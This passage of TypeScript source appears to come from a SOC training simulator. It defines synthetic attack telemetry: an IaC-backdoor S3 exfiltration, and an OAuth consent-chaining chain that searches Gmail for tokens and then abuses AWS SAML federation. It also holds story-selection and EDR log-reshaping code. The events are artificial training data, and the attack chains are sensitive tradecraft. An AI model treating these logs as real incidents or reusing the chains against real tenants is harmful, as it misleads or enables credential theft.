    raw: { "aws.cloudtrail.eventName": "GetObject", "aws.cloudtrail.eventSource": "s3.amazonaws.com", "aws.cloudtrail.requestParameters.bucketName": "rocketstack-prod-customer-data", "aws.cloudtrail.requestParameters.key": "exports/customers_full.csv", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::247316892041:assumed-role/rocketstack-prod-admin/ext-session", "aws.cloudtrail.userIdentity.accessKeyId": "ASIAW4ZRX7PROEXAMPLE", "aws.cloudtrail.recipientAccountId": "247316892041", "aws.cloudtrail.additionalEventData.bytesTransferredOut": "1850624000", "aws.cloudtrail.sourceIPAddress": "91.234.100.55", "action_result": "allowed" }
  },
  {
    id: "rstb6", ts: "2026-06-22T14:24:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "high", vendor: "AWS CloudTrail", src_ip: "91.234.100.55",
    description: "GetSecretValue retrieved the production database master password using the backdoored role session",
    mitre_technique: "T1555.006", mitre_tactic: "Credential Access",
    raw: { "aws.cloudtrail.eventName": "GetSecretValue", "aws.cloudtrail.eventSource": "secretsmanager.amazonaws.com", "aws.cloudtrail.requestParameters.secretId": "rocketstack/prod/db-master-password", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::247316892041:assumed-role/rocketstack-prod-admin/ext-session", "aws.cloudtrail.userIdentity.accessKeyId": "ASIAW4ZRX7PROEXAMPLE", "aws.cloudtrail.recipientAccountId": "247316892041", "aws.cloudtrail.userIdentity.srcAccountId": "999999999999", "aws.cloudtrail.sourceIPAddress": "91.234.100.55", "action_result": "allowed" }
  },
  {
    id: "rstb7", ts: "2026-06-22T14:33:00.000Z", source: "firewall", event_type: "net_connection",
    severity: "high", vendor: "FortiGate", src_ip: "172.16.10.1", dst_ip: "91.234.100.55", dst_port: 443,
    description: "A large outbound transfer from the VPC NAT gateway to 91.234.100.55 was blocked once an IPS signature updated",
    mitre_technique: "T1041", mitre_tactic: "Exfiltration",
    raw: { "data.type": "traffic", "data.subtype": "forward", "data.logid": "0000000021", "data.level": "warning", "data.action": "deny", "data.srcip": "172.16.10.1", "data.dstip": "91.234.100.55", "data.dstport": "443", "data.service": "HTTPS", "data.policyname": "prod-egress-filter", "data.srccountry": "Reserved", "action_result": "blocked" }
  },
  {
    id: "rstb8", ts: "2026-06-22T14:40:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS GuardDuty", src_ip: "91.234.100.55",
    is_detection: true,
    description: "GuardDuty raised Exfiltration:S3/ObjectRead.Unusual for the anomalous high-volume reads from account 999999999999",
    mitre_technique: "T1530", mitre_tactic: "Collection",
    raw: { "aws.guardduty.type": "Exfiltration:S3/AnomalousBehavior", "aws.guardduty.severity": "8.0", "aws.guardduty.title": "An S3 API was invoked in an anomalous way by an IAM principal.", "aws.guardduty.resource.accessKeyDetails.accessKeyId": "ASIAW4ZRX7PROEXAMPLE", "aws.guardduty.resource.accessKeyDetails.userType": "AssumedRole", "aws.guardduty.resource.s3BucketDetails.name": "rocketstack-prod-customer-data", "aws.guardduty.service.action.awsApiCallAction.api": "GetObject", "aws.cloudtrail.awsRegion": "us-east-1", "aws.cloudtrail.recipientAccountId": "247316892041", "action_result": "detected" }
  },
  {
    id: "rstb9", ts: "2026-06-22T15:10:00.000Z", source: "vcs", event_type: "policy_modification",
    severity: "medium", vendor: "GitHub", user_email: "n.shapiro@rocketstack.io",
    description: "The security team reverted the backdoored commit and enabled required reviews on the module repo",
    raw: { "github.audit.action": "branch_protection_rule.update", "github.audit.actor": "n.shapiro", "github.audit.repo": "rocketstack-io/terraform-aws-network", "event.action": "branch_protection_rule.update", "event.outcome": "success", "user.name": "n.shapiro" }
  },
];

// ── RocketStack Chain G — SaaS OAuth consent-chaining → AWS federation abuse ───
const RS_OAUTH_CONSENT_CHAINING: TelemetryEvent[] = [
  {
    id: "rsoc1", ts: "2026-06-28T10:00:00.000Z", source: "gws", event_type: "cloud_role_change",
    severity: "high", vendor: "Google Workspace", user_email: "r.cohen@rocketstack.io",
    description: "r.cohen granted the third-party app QuickSync Analytics broad Drive and Gmail read scopes",
    mitre_technique: "T1528", mitre_tactic: "Credential Access",
    raw: { "gws.event.type": "authorize", "application.name": "QuickSync Analytics", "application.id": "748213906655-a1b2c3d4e5f6g7h8.apps.googleusercontent.com", "application.type": "oauth2", "gws.parameters.scope": "https://www.googleapis.com/auth/drive.readonly,https://mail.google.com/", "gws.parameters.product_bucket": "GMAIL", "event.action": "authorize", "event.outcome": "success", "user.email": "r.cohen@rocketstack.io", "action_result": "allowed" }
  },
  {
    id: "rsoc2", ts: "2026-06-28T10:02:00.000Z", source: "gws", event_type: "cloud_storage_access",
    severity: "high", vendor: "Google Workspace", user_email: "r.cohen@rocketstack.io",
    description: "QuickSync Analytics exported files from the shared Engineering drive, including Prod Infra Runbook.docx",
    mitre_technique: "T1213", mitre_tactic: "Collection",
    raw: { "gws.event.type": "drive.export", "application.name": "QuickSync Analytics", "storage.object.name": "Prod Infra Runbook.docx", "storage.bucket.name": "Shared Drive: Engineering", "cloud.service.name": "Google Drive", "event.action": "drive.export", "event.outcome": "success", "user.email": "r.cohen@rocketstack.io", "action_result": "allowed" }
  },
  {
    id: "rsoc3", ts: "2026-06-28T10:04:00.000Z", source: "gws", event_type: "cloud_api_call",
    severity: "high", vendor: "Google Workspace", user_email: "r.cohen@rocketstack.io",
    description: "QuickSync Analytics searched r.cohen's Gmail for messages matching subject:(okta OR credentials OR password OR token)",
    mitre_technique: "T1114.002", mitre_tactic: "Collection",
    raw: { "gws.event.type": "gmail.messages.list", "application.name": "QuickSync Analytics", "cloud.service.name": "Gmail", "cloud.resource.name": "INBOX", "gws.parameters.query": "subject:(okta OR credentials OR password OR token)", "event.action": "messages.list", "event.outcome": "success", "user.email": "r.cohen@rocketstack.io", "action_result": "allowed" }
  },
  {
    id: "rsoc4", ts: "2026-06-28T10:05:00.000Z", source: "gws", event_type: "cloud_api_call",
    severity: "critical", vendor: "Google Workspace", user_email: "r.cohen@rocketstack.io",
    description: "QuickSync Analytics opened a DevOps handoff email containing a plaintext Okta API token",
    mitre_technique: "T1552.001", mitre_tactic: "Credential Access",
    raw: { "gws.event.type": "gmail.messages.get", "application.name": "QuickSync Analytics", "gws.subject": "Okta API token for CI handoff", "gws.sender": "j.lee@rocketstack.io", "gws.recipient": "r.cohen@rocketstack.io", "event.action": "messages.get", "event.outcome": "success", "user.email": "r.cohen@rocketstack.io", "action_result": "allowed" }
  },
  {
    id: "rsoc5", ts: "2026-06-28T10:11:00.000Z", source: "okta", event_type: "auth_success",
    severity: "high", vendor: "Okta", src_ip: "185.220.101.90",
    is_detection: true,
    description: "The leaked API token's bulk calls to /api/v1/users tripped Okta's integration rate-limit alerting",
    mitre_technique: "T1087.004", mitre_tactic: "Discovery",
    raw: { "okta.eventType": "application.integration.rate_limit_exceeded", "okta.actor.type": "AppInstance", "okta.actor.displayName": "CI Automation Token", "okta.client.ipAddress": "185.220.101.90", "okta.outcome.result": "SUCCESS", "action_result": "detected" }
  },
  {
    id: "rsoc6", ts: "2026-06-28T10:17:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail", src_ip: "185.220.101.90",
    description: "AssumeRoleWithSAML using an Okta-issued assertion succeeded against the AWS federation role from an unfamiliar IP",
    mitre_technique: "T1078.004", mitre_tactic: "Initial Access",
    raw: { "aws.cloudtrail.eventName": "AssumeRoleWithSAML", "aws.cloudtrail.eventSource": "sts.amazonaws.com", "aws.cloudtrail.userIdentity.type": "SAMLUser", "aws.cloudtrail.userIdentity.userName": "r.cohen@rocketstack.io", "aws.cloudtrail.userIdentity.identityProvider": "Okta", "aws.cloudtrail.responseElements.credentials.accessKeyId": "ASIAW4ZRX7OKTAFED07", "aws.cloudtrail.responseElements.assumedRoleUser.arn": "arn:aws:sts::247316892041:assumed-role/rocketstack-okta-federated-admin/r.cohen@rocketstack.io", "aws.cloudtrail.recipientAccountId": "247316892041", "aws.cloudtrail.requestParameters.principalArn": "arn:aws:iam::247316892041:saml-provider/Okta", "aws.cloudtrail.sourceIPAddress": "185.220.101.90", "action_result": "allowed" }
  },
  {
    id: "rsoc7", ts: "2026-06-28T10:21:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail", src_ip: "185.220.101.90",
    description: "The federated session listed buckets and read objects from rocketstack-prod-customer-data",
    mitre_technique: "T1530", mitre_tactic: "Collection",
    raw: { "aws.cloudtrail.eventName": "GetObject", "aws.cloudtrail.eventSource": "s3.amazonaws.com", "aws.cloudtrail.requestParameters.bucketName": "rocketstack-prod-customer-data", "aws.cloudtrail.requestParameters.key": "exports/customers_full.csv", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::247316892041:assumed-role/rocketstack-okta-federated-admin/r.cohen@rocketstack.io", "aws.cloudtrail.userIdentity.accessKeyId": "ASIAW4ZRX7OKTAFED07", "aws.cloudtrail.recipientAccountId": "247316892041", "aws.cloudtrail.additionalEventData.bytesTransferredOut": "740352000", "aws.cloudtrail.sourceIPAddress": "185.220.101.90", "action_result": "allowed" }
  },
  {
    id: "rsoc8", ts: "2026-06-28T10:50:00.000Z", source: "gws", event_type: "account_modify",
    severity: "medium", vendor: "Google Workspace", user_email: "admin@rocketstack.io",
    description: "A Workspace admin revoked QuickSync Analytics' OAuth grant organization-wide",
    raw: { "gws.event.type": "revoke", "application.name": "QuickSync Analytics", "event.action": "revoke", "event.outcome": "success", "user.email": "admin@rocketstack.io", "action_result": "blocked" }
  },
  {
    id: "rsoc9", ts: "2026-06-28T10:55:00.000Z", source: "okta", event_type: "account_modify",
    severity: "medium", vendor: "Okta", src_ip: "172.16.10.7",
    description: "An Okta admin revoked the leaked CI Automation Token and cleared r.cohen's active sessions",
    raw: { "okta.eventType": "system.api_token.revoke", "okta.actor.displayName": "CI Automation Token", "okta.outcome.result": "SUCCESS", "action_result": "blocked" }
  },
];

const QB_ADVANCED_STORIES: AttackStory[] = [
  story("qb-swift-wire-fraud", { title: "SWIFT Wire-Fraud — Vendor Payment Redirect", events: QB_SWIFT_WIRE_FRAUD }, "advanced", ["quantumbank"]),
  story("qb-fraud-monitoring-tampering", { title: "Fraud-Monitoring Tampering — Alarm Threshold Manipulation", events: QB_FRAUD_MONITORING_TAMPERING }, "advanced", ["quantumbank"]),
  story("qb-cyberark-mule-payout", { title: "CyberArk PAM Abuse → Money-Mule Payout (Structuring)", events: QB_CYBERARK_MULE_PAYOUT }, "advanced", ["quantumbank"]),
];

const RS_ADVANCED_STORIES: AttackStory[] = [
  story("rs-cicd-pipeline-poisoning", { title: "CI/CD Pipeline Poisoning — Self-Hosted GitHub Actions Runner", events: RS_CICD_PIPELINE_POISONING }, "advanced", ["rocketstack"]),
  story("rs-terraform-iac-backdoor", { title: "IaC Backdoor — Poisoned Terraform Trust Policy", events: RS_TERRAFORM_IAC_BACKDOOR }, "advanced", ["rocketstack"]),
  story("rs-oauth-consent-chaining", { title: "SaaS OAuth Consent-Chaining → AWS Federation Abuse", events: RS_OAUTH_CONSENT_CHAINING }, "advanced", ["rocketstack"]),
];

// ── AI-related attacks — part of every tier, not a separate track ───────────────
// Insider use of enterprise AI, AI-assisted social engineering, Copilot abuse and
// stolen AI-service credentials, spread across foundation/core/advanced so analysts
// meet them as ordinary incidents (research: research/ai-attacks-soc/).
const AI_STORIES: AttackStory[] = [
  ...AI_FOUNDATION_STORIES.map(d => story(d.id, { title: d.title, events: d.events }, d.complexity, d.companies)),
  ...AI_CORE_STORIES.map(d => story(d.id, { title: d.title, events: d.events }, d.complexity, d.companies)),
  ...AI_EXTRA_STORIES.map(d => story(d.id, { title: d.title, events: d.events }, d.complexity, d.companies)),
  ...AI_WAVE2_STORIES.map(d => story(d.id, { title: d.title, events: d.events }, d.complexity, d.companies)),
  ...AI_ADVANCED_A_STORIES.map(d => story(d.id, { title: d.title, events: d.events }, d.complexity, d.companies)),
  story("ai-llmjacking-bedrock", { title: "Stolen CI Key Used for Bedrock Inference (LLMjacking)", events: aiLlmJackingScenarioEvents().events }, "advanced", ["quantumbank"]),
];

/**
 * No cryptocurrency incidents (Tal, 2026-10-02): mining / cryptojacking / wallet clippers are
 * not what the SOC trains for. These storylines stay out of every feed and team exercise.
 */
const EXCLUDED_STORIES = new Set(["bundled-cryptominer", "drive-by-browser-miner", "clipboard-clipper", "rocketstack-chain-c",
  "ai-bedrock-key-abuse"]); // same incident as ai-llmjacking-bedrock (leaked CI AKIA → Sysdig Bedrock sequence), which is the fuller story

export const ATTACK_STORIES: AttackStory[] = [
  ...GENERIC_STORIES,
  ...COMPANY_CHAIN_STORIES,
  ROCKETSTACK_CRED_STUFFING_STORY,
  ...QB_ADVANCED_STORIES,
  ...RS_ADVANCED_STORIES,
  ...AI_STORIES,
].filter(s => !EXCLUDED_STORIES.has(s.id));

// ── Company fit ───────────────────────────────────────────────────────────────

/**
 * A story source is "available" at a company if the company's SIEM architecture
 * includes it or an equivalent telemetry channel that would carry those logs.
 */
const SOURCE_ALIASES: Record<string, string[]> = {
  sysmon:    ["sysmon", "edr"],
  proxy:     ["proxy", "firewall"],
  dns:       ["dns", "firewall"],
  iam:       ["okta", "ad", "o365"],
  okta:      ["okta"],
  ueba:      ["edr", "okta", "ad", "o365", "gws"],
  k8s_audit: ["cloudtrail"],
  dlp:       ["o365", "gws", "edr"],
  email:     ["o365", "gws"],
  // Scenario-pack source types → the company channel that ingests them. These
  // stories are company-allowlisted, so this only quiets the dev sanity-warning;
  // it does not affect selection.
  windows_security: ["ad", "sysmon", "edr"],   // DC/Windows Security events via the AD channel
  ids:              ["firewall", "ids"],        // an IPS signature is an NGFW/firewall-class source
  linux_audit:      ["edr", "sysmon"],          // auditd shipped by the endpoint agent
  email_gateway:    ["o365", "gws"],
  sharepoint:       ["o365"],                   // SharePoint/OneDrive audit arrives through the M365 unified audit log
  waf:              ["firewall", "cloudtrail"],  // WAF is an edge/firewall-class device
  db_monitor:       ["edr", "cloudtrail"],       // database activity monitoring
  cloud_azure:      ["o365", "cloudtrail"],
  vcs:              ["cloudtrail"],              // GitHub/source-control audit trail, alongside the cloud estate it deploys into
  // SIEM/SOAR correlation + automation meta-events are produced by the platform
  // itself, so they are "available" wherever the SIEM is (i.e. everywhere).
  siem: ["edr", "ad", "o365", "okta", "cloudtrail", "firewall", "vpn", "dns", "proxy", "gws", "sysmon"],
  soar: ["edr", "ad", "o365", "okta", "cloudtrail", "firewall", "vpn", "dns", "proxy", "gws", "sysmon"],
};

function companySources(companyId: string): string[] {
  const profile = COMPANY_PROFILES.find(c => c.id === companyId);
  return profile?.architecture.sources ?? [];
}

function sourceAvailable(src: string, sources: string[]): boolean {
  const accepted = SOURCE_ALIASES[src] ?? [src];
  return accepted.some(a => sources.includes(a));
}

/** Fraction of the story's events whose source exists in the company architecture */
function sourceFitRatio(s: AttackStory, sources: string[]): number {
  if (s.events.length === 0) return 0;
  const ok = s.events.filter(e => sourceAvailable(e.source, sources)).length;
  return ok / s.events.length;
}

/**
 * Which complexity tiers a chosen dashboard difficulty draws from. Easy is
 * restricted to "foundation" ONLY — a brand-new student's very first attacks
 * must never include lateral movement, credential theft, or a cloud pivot.
 * Medium opens up to "core" as well; Hard is the full kill-chain pool.
 */
const COMPLEXITY_FOR_DIFFICULTY: Record<"easy" | "medium" | "hard", StoryComplexity[]> = {
  easy:   ["foundation"],
  medium: ["foundation", "core"],
  hard:   ["advanced"],
};

export function storiesForCompany(companyId: string, difficulty?: "easy" | "medium" | "hard"): AttackStory[] {
  const sources = companySources(companyId);
  const explicit = (s: AttackStory) => s.companies ? s.companies.includes(companyId) : null;

  const pick = (allowedComplexity: StoryComplexity[] | null): AttackStory[] => {
    const complexityOk = (s: AttackStory) => !allowedComplexity || allowedComplexity.includes(s.complexity);
    // Strict pass: every event's source is available
    const strict = ATTACK_STORIES.filter(s => { if (!complexityOk(s)) return false; const e = explicit(s); return e !== null ? e : sourceFitRatio(s, sources) === 1; });
    if (strict.length >= 4) return strict;
    // Relaxed pass: ≥80% of events fit (keeps enough variety for Okta-only shops)
    const relaxed = ATTACK_STORIES.filter(s => { if (!complexityOk(s)) return false; const e = explicit(s); return e !== null ? e : sourceFitRatio(s, sources) >= 0.8; });
    if (relaxed.length >= 3) return relaxed;
    // Fallback within the requested complexity tier: never leave a company without attacks
    const withinComplexity = ATTACK_STORIES.filter(s => complexityOk(s) && explicit(s) !== false);
    if (withinComplexity.length > 0) return withinComplexity;
    // Last resort: ignore the tier rather than showing no attack.
    return ATTACK_STORIES.filter(s => explicit(s) !== false);
  };

  let result = pick(difficulty ? COMPLEXITY_FOR_DIFFICULTY[difficulty] : null);
  // Hard is advanced-only; when a company's advanced-fit pool is thin, broaden to
  // include 'core' so "hard" isn't a tiny loop of the same incidents (e.g. QuantumBank
  // had only 4 advanced-fit stories, RocketStack 8). Keeps hard rich where it already is.
  if (difficulty === "hard" && result.length < 8) result = pick(["advanced", "core"]);
  return result;
}

// ── Anti-repeat memory ────────────────────────────────────────────────────────

const RECENT_KEY = "soc_recent_story_ids";
const RECENT_N   = 8;

function readRecent(): string[] {
  // E-22: storage can throw (private mode / blocked) and the value can be any shape.
  return lsReadJson(RECENT_KEY, [] as string[], isStringArray);
}

function pushRecent(id: string) {
  const next = [id, ...readRecent().filter(x => x !== id)].slice(0, RECENT_N);
  lsSet(RECENT_KEY, JSON.stringify(next));
}

/**
 * Pick the session's attack story for a company: fits the company architecture,
 * matches the requested difficulty's complexity tier, avoids the last N
 * stories seen, remembers the choice. `accept` narrows the draw (e.g. to stories the
 * session's chosen security products can show whole); if nothing passes, the
 * unfiltered candidates are used so a session never runs without an attack.
 */
export function pickStoryForCompany(companyId: string, difficulty?: "easy" | "medium" | "hard", accept?: (s: AttackStory) => boolean): AttackStory {
  const all = storiesForCompany(companyId, difficulty);
  const fitting = accept ? all.filter(accept) : all;
  const candidates = fitting.length ? fitting : all;
  const recent = readRecent();
  let pool = candidates.filter(s => !recent.includes(s.id));
  if (pool.length === 0) pool = candidates; // every candidate seen recently — allow repeats
  const picked = pool[Math.floor(Math.random() * pool.length)];
  pushRecent(picked.id);
  if (process.env.NODE_ENV !== "production") {
    const sources = companySources(companyId);
    const missing = Array.from(new Set(picked.events.map(e => e.source)))
      .filter(src => !sourceAvailable(src, sources));
    if (missing.length > 0) {
      console.warn(`[attackStories] story "${picked.id}" uses sources missing at ${companyId}:`, missing);
    }
  }
  return picked;
}

// ── Victim variation ──────────────────────────────────────────────────────────

// Non-human accounts never become a story's victim (a badge reader reading phish mail,
// "cyberark.svc" browsing to a fake update page).
const SERVICE_ACCOUNT = /^(svc[-._]|ci-|admin@|noreply|system@)|[-._]svc@|(^|[-._])(service|device|badge|printer|scanner|kiosk|backup|sync|bot|replication|repl|deploy|monitor|monitoring|daemon|automation|scan|sql|dc|krbtgt|healthcheck)([-._@]|$)/i;

// Department words authored next to a host ("the HR workstation WS-HR-1142"): after a
// host swap they must still describe the host named — "developer workstation WS-MKT-3301"
// is wrong, so the department word goes when the new host's naming says otherwise.
const ROLE_HOST: [RegExp, RegExp][] = [
  [/^HR$/i, /-HR-/i], [/^finance$/i, /-(FIN|ACC|TRADE|RISK)-/i], [/^(engineering|developer|dev)$/i, /-(ENG|DEV)-/i],
  [/^marketing$/i, /-MKT-/i], [/^sales$/i, /-(SALES|SLS)-/i],
];
function fixRoleWords(text: string): string {
  return text.replace(/\b(HR|finance|engineering|developer|dev|marketing|sales) (workstation|laptop|machine|PC|desktop)( [A-Z]{2,6}-[A-Z0-9-]{2,})/gi,
    (m, role: string, noun: string, host: string) => {
      const rule = ROLE_HOST.find(([r]) => r.test(role));
      return rule && !rule[1].test(host) ? `${noun}${host}` : m;
    });
}

/**
 * Every OTHER demo company's identity → this company's (domain, SharePoint tenant, brand,
 * realm). Pass `others` to limit the swap to some companies.
 */
function otherTenantPairs(companyId: string, others: string[] = Object.keys(COMPANY_ASSETS)): [string, string][] {
  const pairs: [string, string][] = [];
  const brandOf = (id: string) => (COMPANY_PROFILES.find(c => c.id === id)?.name ?? id).split(/\s+/)[0];
  const stemOf = (id: string) => (COMPANY_ASSETS[id]?.domain ?? id).split(".")[0];
  const me = { brand: brandOf(companyId), stem: stemOf(companyId), domain: COMPANY_ASSETS[companyId].domain, netbios: COMPANY_ASSETS[companyId].netbios };
  for (const other of others) {
    if (other === companyId || !COMPANY_ASSETS[other]) continue;
    const o = { brand: brandOf(other), stem: stemOf(other), domain: COMPANY_ASSETS[other].domain, netbios: COMPANY_ASSETS[other].netbios };
    pairs.push(
      [o.domain, me.domain],
      [`${o.stem}.sharepoint.com`, `${me.stem}.sharepoint.com`],
      [`${o.stem}-my.sharepoint.com`, `${me.stem}-my.sharepoint.com`],
      [o.brand, me.brand],
      [o.brand.toLowerCase(), me.brand.toLowerCase()],
      [o.brand.toUpperCase(), me.netbios],
      [o.brand.charAt(0) + o.brand.slice(1).toLowerCase(), me.brand],
    );
    if (o.netbios !== o.brand.toUpperCase()) pairs.push([o.netbios, me.netbios]);
    // Tenant identifiers the native records derive per company (Entra tenant / Azure subscription,
    // the Zscaler egress): a story authored with one tenant's ids reads as this tenant's.
    const ot = makeCtx(other), mt = makeCtx(companyId);
    pairs.push(
      [ot.tenant.azureTenantId, mt.tenant.azureTenantId],
      [ot.tenant.azureSubscriptionId, mt.tenant.azureSubscriptionId],
      [ot.tenant.azureSubscriptionId.toUpperCase(), mt.tenant.azureSubscriptionId.toUpperCase()],
      [testNetIp(ot, `${other}:egress`), testNetIp(mt, `${companyId}:egress`)],
    );
  }
  return pairs;
}

/** A company's host-name code (SRV-NXC-DC01 → NXC, SRV-QB-ADMIN01 → QB), from its own hosts. */
function hostCodeOf(events: TelemetryEvent[]): string | undefined {
  const counts = new Map<string, number>();
  for (const e of events) {
    const m = e.hostname ? /^(?:SRV|SVR|WKS|WS|LT|LAP)-([A-Z]{2,5})-/.exec(e.hostname) : null;
    if (m) counts.set(m[1], (counts.get(m[1]) ?? 0) + 1);
  }
  return [...counts].sort((a, b) => b[1] - a[1])[0]?.[0];
}

/**
 * Another company's ordinary logs, re-homed to `companyId`: its people, domain, brand,
 * realm and host-name code become this company's (a named-organization exercise borrows
 * the AWS / PAM noise its template lacks — never an attack, never another tenant's name).
 */
export function rehomeEvents(events: TelemetryEvent[], fromCompany: string, companyId: string, companyEvents: TelemetryEvent[]): TelemetryEvent[] {
  if (!COMPANY_ASSETS[companyId]) return events;
  const pairs = otherTenantPairs(companyId, [fromCompany]);
  const from = hostCodeOf(events), to = hostCodeOf(companyEvents);
  if (from && to && from !== to) pairs.push([`-${from}-`, `-${to}-`]);
  const clean = pairs.filter(([f, t]) => f && t && f !== t).sort((a, b) => b[0].length - a[0].length);
  return events.map(e => deepReplace(e, clean) as TelemetryEvent);
}

/** The stories a dashboard difficulty draws from, by complexity tier alone (no company fit). */
export function storiesForTier(difficulty: "easy" | "medium" | "hard", broaden = false): AttackStory[] {
  const tiers: StoryComplexity[] = difficulty === "hard" && broaden ? ["advanced", "core"] : COMPLEXITY_FOR_DIFFICULTY[difficulty];
  return ATTACK_STORIES.filter(s => tiers.includes(s.complexity));
}

/** Deep string-replace across every value of a raw object (recurses arrays/objects). */
function deepReplace(value: unknown, pairs: [string, string][]): unknown {
  if (typeof value === "string") {
    let out = value;
    for (const [from, to] of pairs) if (from && out.includes(from)) out = out.split(from).join(to);
    return out;
  }
  if (Array.isArray(value)) return value.map(v => deepReplace(v, pairs));
  if (value && typeof value === "object") {
    const o: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(value)) o[k] = deepReplace(v, pairs);
    return o;
  }
  return value;
}

// ── EDR vendor namespace normalisation (L-03) ────────────────────────────────
// The attack corpus is authored almost entirely on CrowdStrike's rich schema. When
// it lands on a company that runs a DIFFERENT EDR, the vendor-namespaced raw keys
// (crowdstrike.*) are a dead giveaway — on a SentinelOne shop every crowdstrike.*
// event IS the attack, and the field itself is invalid for that vendor. All the real
// evidence lives in the structured process/file fields (rendered by the feed, kept
// untouched here), so we reshape the raw block to the TARGET vendor's small,
// baseline-matching convention: drop foreign-vendor keys, keep the vendor-neutral
// (ECS) keys, and add the handful of target-vendor keys the company's own baseline +
// authored attacks actually use. Nothing is invented — every emitted key already
// appears in that company's feed.
type EdrNs = "crowdstrike" | "s1" | "sophos" | "mde";
const ANY_EDR_NS = /^(crowdstrike|s1|sophos|mde|cortex)\./;
// When reshaping to another vendor we keep only the small set of vendor-NEUTRAL keys
// the target companies' own EDR events actually use (evidence lives in the structured
// process/file fields). This also drops vendor-flavoured "neutral" keys like
// event.provider:"Microsoft Defender ATP" / event.dataset:"DeviceProcessEvents" that
// would otherwise out a Defender-authored event on a SentinelOne/Sophos shop.
const KEEP_NEUTRAL_PREFIX = /^(process|file|threat|source|destination|network|dns|usb|user|host|registry|url|http)\./;
// Task Scheduler facts are the event itself, not vendor convention — kept across a reshape.
const KEEP_NEUTRAL_EXACT = new Set(["action_result", "quarantine.status", "policy.name", "event.action", "event.outcome", "event.category",
  "TaskName", "TaskExecCommand", "TaskAuthor", "TaskContent", "task.name", "task.path"]);
// EDR product names that appear in prose/raw values — mapped to the company's own EDR
// so a description like "CrowdStrike Falcon killed…" can't out the attack elsewhere.
const EDR_PRODUCT_NAMES = [
  "Microsoft Defender for Endpoint", "Microsoft Defender ATP", "Microsoft Defender",
  "CrowdStrike Falcon Elite", "CrowdStrike Falcon", "SentinelOne Singularity",
  "Sophos Intercept X", "Cortex XDR", "Carbon Black",
  "CrowdStrike", "SentinelOne", "Sophos", "Falcon", "Defender",
];

function edrNsOfVendor(vendor?: string): EdrNs | null {
  const v = (vendor ?? "").toLowerCase();
  if (v.includes("crowdstrike") || v.includes("falcon")) return "crowdstrike";
  if (v.includes("sentinelone") || v.includes("singularity")) return "s1";
  if (v.includes("sophos")) return "sophos";
  if (v.includes("defender") || v === "mde") return "mde";
  return null;
}
function edrNsOfKeys(raw?: Record<string, unknown>): EdrNs | null {
  for (const k of Object.keys(raw ?? {})) {
    if (k.startsWith("crowdstrike.")) return "crowdstrike";
    if (k.startsWith("s1.")) return "s1";
    if (k.startsWith("sophos.")) return "sophos";
    if (k.startsWith("mde.")) return "mde";
  }
  return null;
}

// SentinelOne Deep Visibility eventType values (authentic — the console shows these).
const S1_EVENT_TYPE: Record<string, string> = {
  process_create: "Process Creation", file_create: "File Creation",
  net_connection: "IP Connect", av_detection: "Threats", detection: "Threats",
};
const SOPHOS_EVENT_TYPE: Record<string, string> = {
  process_create: "Process", file_create: "File",
  net_connection: "Network", av_detection: "Malware", detection: "Malware",
};
function edrAction(e: TelemetryEvent): string {
  const r = String(e.raw?.["action_result"] ?? "").toLowerCase();
  if (r.includes("kill")) return "kill";
  if (r.includes("block") || r.includes("quarantin")) return "quarantine";
  return "detect_only";
}

/** Rebuild an EDR event's raw block in `target`'s convention (see comment above). */
function reshapeEdrRaw(e: TelemetryEvent, target: EdrNs): Record<string, unknown> {
  const src = e.raw ?? {};
  const neutral: Record<string, unknown> = {};        // only whitelisted neutral keys
  for (const [k, v] of Object.entries(src)) if (KEEP_NEUTRAL_PREFIX.test(k) || KEEP_NEUTRAL_EXACT.has(k)) neutral[k] = v;

  const et = e.event_type ?? "";
  const isDetection = e.is_detection === true || /detection|threat|malware|ransom/i.test(et);
  const block: Record<string, unknown> = {};
  if (target === "crowdstrike") {
    // Map each telemetry kind to its real FDR event_simpleName — never DetectionSummaryEvent
    // for a non-detection (a file write mislabelled that way renders as a spurious alert).
    block["crowdstrike.event_simpleName"] = isDetection ? "DetectionSummaryEvent"
      : et === "process_create" || et === "scheduled_task" || et === "service_install" ? "ProcessRollup2"
      : et === "net_connection" ? "NetworkConnectIP4"
      : et === "dns_query" ? "DnsRequest"
      : et === "registry_set" ? "AsepValueUpdate"
      : et === "file_create" || et === "file_modify" ? "NewExecutableWritten"
      : "ProcessRollup2";
    if (e.severity) block["crowdstrike.SeverityName"] = e.severity.toUpperCase();
  } else if (target === "s1") {
    // Authentic SentinelOne Deep Visibility / threatInfo schema (no invented flat keys).
    block["s1.eventType"] = S1_EVENT_TYPE[et] ?? (isDetection ? "Threats" : "Indicators");
    if (e.hostname) block["s1.agent.computerName"] = e.hostname;
    if (isDetection) {
      // The threat's file, never a placeholder name (the S1 module falls back to the file itself).
      const tn = String(src["threat.name"] ?? "");
      if (tn) block["s1.threat.threatName"] = tn;
      block["s1.threat.confidenceLevel"] = "malicious";
      block["s1.threat.classification"] = "Malware";
      block["s1.threat.mitigationStatus"] = edrAction(e) === "detect_only" ? "not_mitigated" : "mitigated";
      block["s1.detection.classification"] = "Malware";
    }
    // Non-detection Deep Visibility telemetry carries no classification — stamping
    // "Benign" on a story's malicious PowerShell told the analyst the answer (wrongly).
  } else if (target === "sophos") {
    block["sophos.event_type"] = SOPHOS_EVENT_TYPE[et] ?? (isDetection ? "Malware" : "Event");
    block["sophos.detection_name"] = isDetection ? (String(src["threat.name"] ?? "") || "Troj/Agent-A") : "none";
    if (isDetection) block["sophos.action"] = edrAction(e);
  } else {
    // Authentic Microsoft Defender Advanced-Hunting columns.
    block["ActionType"] = et === "process_create" ? "ProcessCreated"
      : et === "net_connection" ? "ConnectionSuccess"
      : et === "file_create" ? "FileCreated"
      : isDetection ? "AlertRaised" : "GeneralEvent";
    if (e.hostname) block["DeviceName"] = e.hostname.toLowerCase();
    if (isDetection) {
      block["mde.AlertTitle"] = String(src["threat.name"] ?? src["malware.name"] ?? "") || "Suspicious activity detected";
